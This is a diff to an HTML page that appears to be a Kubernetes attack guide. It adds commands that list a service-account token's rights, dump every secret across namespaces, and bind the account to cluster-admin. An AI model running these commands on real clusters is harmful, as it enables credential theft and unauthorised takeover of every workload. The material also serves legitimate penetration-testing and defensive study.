@@ -129,6 +129,12 @@ env | grep -i kube     # API server address, and sometimes cloud creds</code></p
           <li><code>create</code> on roles/bindings &mdash; grant yourself cluster-admin.</li>
           <li>Access to the <strong>kubelet</strong> API or an exposed <strong>etcd</strong> &mdash; read all cluster state and secrets directly.</li>
         </ul>
+        <pre><code># what can this token do? then act on it
+kubectl auth can-i --list
+kubectl get secrets -A -o json              # if list-secrets is allowed
+kubectl auth can-i create clusterrolebindings
+# bind yourself cluster-admin if that right exists:
+kubectl create clusterrolebinding x --clusterrole=cluster-admin --serviceaccount=&lt;ns&gt;:&lt;sa&gt;</code></pre>
         <blockquote>
           The escalation graph is: <strong>pod &rarr; service-account rights &rarr;
           cluster-admin or a node &rarr; every workload</strong>. Tools like
